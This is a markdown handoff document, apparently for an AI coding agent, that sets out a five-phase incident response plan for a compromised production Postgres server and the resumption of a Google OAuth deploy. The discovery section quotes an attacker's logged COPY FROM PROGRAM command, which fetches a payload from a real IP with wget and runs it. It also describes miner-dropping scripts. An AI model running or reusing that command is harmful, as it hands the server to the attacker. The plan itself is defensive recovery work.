# Handoff — Postgres compromise + Google OAuth deploy resume

**For a fresh Claude Code chat. Start by reading this whole file before touching anything.**

---

## Goal

Execute the 5-phase incident response plan for the compromised postgres on **voice.noral.ai** (production). End state: site back up clean, every credential the DB ever saw rotated, native Google OAuth deploy (which was in flight when this was discovered) live.

## How this got discovered

A previous session was deploying native Google OAuth. During the deploy, the new api container failed to authenticate to postgres. Investigation surfaced:

1. **Rogue `priv_esc` SUPERUSER role** in postgres (confirmed via `docker exec dograh-postgres-1 psql -U postgres -c '\du'`)
2. **Active malware delivery attempts** in postgres logs — `COPY tests FROM PROGRAM 'cd /tmp; wget http://83.142.209.35/kunt; chmod 777 kunt; sh kunt'` and base64-encoded shell scripts that kill competing miners (`kdevtmpfsi`, `kinsing`, `pg_mem`, etc.) and drop a binary called `bot`. This is the **pg_mem / Operation Hadooken** cryptominer pattern that hits postgres with default credentials exposed to the internet.
3. **Attacker likely changed the `postgres` password.** The old api had a live connection from before. After we recycled it for the v8 swap, nothing new can re-auth. `psql -U postgres` from inside the container still works via the local socket (trust auth), but TCP auth fails. Site is **currently DOWN**.

Assume full compromise. Assume everything in the DB was exfiltrated. Don't bother with deep forensics — pragmatic recovery.

## Access + state

- **SSH**: `ssh root@voice.noral.ai` — passwordless key auth works
- **Repo on server**: `/root/NoralVoice`
- **Branch checked out on server**: `claude/romantic-bohr-58ad3f` (has Google OAuth commit `b7a2468`)
- **Compose project name**: `dograh` (NOT `noralvoice` — existing volumes are dograh-prefixed; using a different project name creates phantom containers that conflict)
- **Always invoke compose with**: `docker compose -p dograh --env-file .env ...`

### Pre-built artifacts on the server (don't rebuild)

- `noralvoice-api:rebrand-v8` — already built, ready to deploy after recovery
- `noralvoice-ui:rebrand-v8` — same
- Override is currently pinned at `rebrand-v7` (rolled back during incident)
- `.env` has the Google OAuth vars at the bottom; backup at `/root/NoralVoice/.env.bak.1779061300`
- Branch `claude/romantic-bohr-58ad3f` is pushed to `origin` — server has it checked out

## Critical safety rules

1. **Phase 1 audit is read-only.** Run it, report findings, then ask user before any mutation.
2. **Phase 2 requires user input** on the backup strategy — DO NOT touch the postgres volume until they answer the gate question.
3. **Phase 3 rotation: provider credentials are user-only.** I can list what needs rotating and update the DB once user provides new values, but I don't log into OpenAI/Twilio/etc on their behalf.
4. **No `rm -rf` on volumes.** Use rename / `docker volume create <new>` + cp. The compromised volume is evidence — preserve it.
5. **Smoke test in a real browser** (Claude in Chrome MCP) before declaring done.

---

## Phase 1 — Contain + preserve evidence (~15 min)

### Read-only audit — run this first, report results

```bash
ssh root@voice.noral.ai bash -s <<'EOF'
echo "===== EXPOSED PORTS ====="
docker port dograh-postgres-1 2>&1
echo "===== POSTGRES CONTAINER /tmp ====="
docker exec dograh-postgres-1 ls -la /tmp 2>&1 | head -20
echo "===== HOST /tmp ====="
ls -la /tmp 2>&1 | grep -vE 'systemd|snap|claude|tmux' | head -20
echo "===== HOST PROCESSES (CPU sorted) ====="
ps auxf --sort=-pcpu 2>&1 | head -20
echo "===== UFW STATUS ====="
ufw status verbose 2>&1
echo "===== LISTENING PORTS ====="
ss -tlnp | grep -vE '^State' | head -30
echo "===== AUTH LOG TAIL ====="
tail -30 /var/log/auth.log 2>&1
echo "===== ROOT CRON ====="
crontab -l 2>&1
echo "===== POSTGRES ROLES ====="
docker exec dograh-postgres-1 psql -U postgres -c '\du' 2>&1
echo "===== POSTGRES EVENT TRIGGERS ====="
docker exec dograh-postgres-1 psql -U postgres -c 'SELECT evtname, evtevent, evtfoid::regprocedure FROM pg_event_trigger' 2>&1
EOF
```

### Mutation steps (gate each on user confirmation)

1. **Close postgres externally**:
   - Remove `ports: ["5432:5432"]` (if present) from `/root/NoralVoice/docker-compose.yaml`
   - `ufw deny 5432`
   - `docker compose -p dograh --env-file .env up -d postgres` to recreate without port mapping
2. **Snapshot the postgres volume** (evidence preservation, ~30s):
   ```bash
   ssh root@voice.noral.ai 'mkdir -p /root/incident-2026-05-17 && \
     docker run --rm \
       -v dograh_postgres_data:/data:ro \
       -v /root/incident-2026-05-17:/backup \
       alpine tar czf /backup/postgres-volume-snapshot.tgz -C / data'
   ```
   (volume name may be different — confirm with `docker volume ls | grep postgres` first)
3. **Save full postgres logs**:
   ```bash
   ssh root@voice.noral.ai 'docker logs dograh-postgres-1 > /root/incident-2026-05-17/postgres-full.log 2>&1'
   ```

---

## Phase 2 — Rebuild postgres clean (~45 min)

### GATE: ask the user

> "When was your last `pg_dump` backup, and where is it stored?"

Branches:

- **(a) Recent dump exists** → restore from dump, accept any post-dump data loss
- **(b) No dump** → `pg_dump --schema-only` from compromised DB, load into fresh DB, manually re-import critical data tables without functions / triggers / event triggers (the attacker may have planted any of those)

### Steps (general shape — adapt to user's backup answer)

```bash
ssh root@voice.noral.ai bash -s <<'EOF'
cd /root/NoralVoice
# Stop everything; postgres data is in its volume, not the container
docker compose -p dograh down

# Generate new password (don't echo to a file in the repo)
NEW_PW=$(openssl rand -hex 32)
echo "NEW POSTGRES PW: $NEW_PW"  # capture this; need to write to .env + docker-compose.yaml

# Move compromised volume to a quarantine name (don't delete!)
docker volume create dograh_postgres_data_quarantine_2026_05_17
# ... copy data from old volume to quarantine via a temp alpine container
# ... then remove dograh_postgres_data so postgres init creates a fresh one

# Bring up postgres ONLY with new password, verify it boots
# Then either pg_restore from clean dump, or pg_dump --schema-only + selective re-import
EOF
```

**Update both**: `DATABASE_URL` in `docker-compose.yaml`'s `api:` service env block, AND `POSTGRES_PASSWORD` in the `postgres:` service env block. They must match.

**DO NOT** bring api/ui up until Phase 3 secret rotations are done — every minute the api is up using credentials the attacker has is more leakage.

---

## Phase 3 — Rotate every secret the DB ever saw (~60 min)

### Enumerate (read-only, no rotation yet)

```bash
ssh root@voice.noral.ai bash -s <<'EOF'
echo "===== USER CONFIGURATIONS (AI provider keys) ====="
docker exec dograh-postgres-1 psql -U postgres -d postgres -c \
  "SELECT id, user_id,
          configuration->'llm'->>'provider' as llm,
          configuration->'tts'->>'provider' as tts,
          configuration->'stt'->>'provider' as stt
   FROM user_configurations"
echo "===== TELEPHONY CONFIGURATIONS ====="
docker exec dograh-postgres-1 psql -U postgres -d postgres -c \
  "SELECT id, organization_id, provider, name FROM telephony_configurations"
echo "===== INTEGRATION CREDENTIALS ====="
docker exec dograh-postgres-1 psql -U postgres -d postgres -c \
  "SELECT id, organization_id, type, name FROM integration_credentials" 2>&1
EOF
```

### Rotate in this order

1. **`OSS_JWT_SECRET`** in `/root/NoralVoice/.env` → `openssl rand -hex 32`, write, restart api. Cheap. Invalidates all existing sessions, everyone re-logs in.
2. **`postgres` password** — already rotated in Phase 2.
3. **AI provider API keys** in `user_configurations` (OpenAI, Anthropic, Deepgram, ElevenLabs, Cartesia, etc.) — walk user through each provider portal, get new keys, update the DB row's `configuration` JSON.
4. **Telephony provider secrets** in `telephony_configurations` (Twilio, Telnyx, Plivo) — walk user through each provider portal. **This is the highest financial-loss risk** — attackers monetize stolen telephony credentials by placing premium-rate calls; rotate even if you skip everything else.
5. **Integration tokens** in `integration_credentials` (whatever third-party tokens stored).
6. **Google OAuth secret** for voice.noral.ai — rotate via GCP console: open OAuth client `voice.noral.ai` in project `noral-voice`, "Add secret", update `GOOGLE_CLIENT_SECRET` in `.env`, delete old secret. (The current secret was created during the original chat and lives in the chat transcript — assume the secret in transcript is burned even though it wasn't in the DB.)

---

## Phase 4 — Restore service + ship Google OAuth (~15 min)

```bash
ssh root@voice.noral.ai bash -s <<'EOF'
cd /root/NoralVoice
# Confirm v8 images still present
docker images noralvoice-api:rebrand-v8
docker images noralvoice-ui:rebrand-v8

# Switch override back to v8
sed -i 's/rebrand-v7/rebrand-v8/g' docker-compose.override.yaml

# Bring up
docker compose -p dograh --env-file .env up -d

# Verify
sleep 10
docker ps --format '{{.Names}}: {{.Image}} ({{.Status}})' | grep -E 'api|ui|postgres|redis|minio'
curl -fsS https://voice.noral.ai/api/v1/health
EOF
```

`/api/v1/health` should return JSON with `google_oauth_enabled: true`.

### Smoke test (Claude in Chrome MCP)

1. Navigate to https://voice.noral.ai/auth/login
2. Verify "Sign in with Google" button visible
3. Click it → expect 302 to Google
4. Sign in → expect redirect back to `/after-sign-in`
5. Verify session cookie set (DevTools → Application → Cookies → `noralvoice_auth_token`)

---

## Phase 5 — Hardening (~30 min)

1. **Firewall**: `ufw enable && ufw default deny incoming && ufw allow 22 && ufw allow 80 && ufw allow 443` then explicitly deny 5432, 6379, 9000 (postgres/redis/minio). Verify with `nmap` from outside.
2. **Remove port mappings entirely** from `docker-compose.yaml` for postgres/redis/minio — they only need to be reachable via the docker network, not the host.
3. **Cron sanity check** on postgres roles — script that runs every 5 min, alerts (email/Slack) if `pg_roles` contains any superuser besides the expected ones.
4. **Audit cloudflared-tunnel** config — confirm it's the only external ingress path and that bypassing it (direct hits to the server's public IP) is blocked.
5. **Save a baseline**: `pg_dump` immediately after Phase 4 succeeds, store off-host (S3 / B2). Schedule daily.

---

## When you're done

- voice.noral.ai responds with health JSON including `google_oauth_enabled: true`
- "Sign in with Google" on the login page completes the round-trip successfully
- `\du` on postgres shows only the expected roles
- Postgres port 5432 is not reachable from outside the host
- All AI / telephony / integration credentials rotated, none of the old ones still in the DB
- `/root/incident-2026-05-17/` contains the postgres volume snapshot + full logs (preserved evidence)
- `git status` on `/root/NoralVoice` is clean (or only the expected untracked files: `certs/`, `dograh/`, the override yaml)

## Things to NOT do

- Don't delete the quarantined postgres volume or `/root/incident-2026-05-17/` snapshot until the user explicitly says so. Future them may want to look at it.
- Don't run automated malware scans (chkrootkit, rkhunter) without telling the user — they take long, generate noise, and the user may have an opinion.
- Don't `git reset --hard` anything on the server. The repo state is fine; the compromise is in the postgres data, not git.
- Don't rotate the Google OAuth secret BEFORE Phase 4 completes — you'd lock yourself out of testing.

## Open questions to surface up front

1. **When was your last `pg_dump`?** (Gates Phase 2 strategy.)
2. **Any regulatory/contract disclosure obligation?** (HIPAA, GDPR, SOC 2 customer contracts?) If yes — slow down, bring in counsel before rotating evidence away.
3. **Any other environments sharing this DB or similar credentials?** (Staging? Local dev DBs that mirror prod?)

## Useful memory references for new chat

- `feedback_execute_dont_handoff.md` — finish the deploy autonomously; don't drop a checklist
- `feedback_cleanup_scope.md` — "get to deployable" includes deploy + verify, not just code
- `project_noralvoice_stack.md` — tech stack overview
